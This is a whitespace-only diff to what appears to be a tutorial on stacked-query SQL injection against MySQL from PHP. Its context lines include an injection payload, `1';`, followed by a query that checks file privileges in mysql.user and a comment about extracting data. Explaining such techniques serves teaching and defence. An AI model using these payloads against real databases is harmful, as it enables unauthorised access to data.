@@ -29,6 +29,7 @@ For stacked queries to work, two conditions must be met:
 2. The application must use a database connector that supports multi-queries
 
 In PHP, for example:
+
 - `mysqli_multi_query()` supports stacked queries
 - `mysqli_query()` does not support stacked queries
 
@@ -101,7 +102,7 @@ If MySQL has the FILE privilege:
 A comprehensive attack might look like:
 
 ```sql
-1'; 
+1';
 -- Check privileges
 SELECT user,file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1);
 -- Extract data
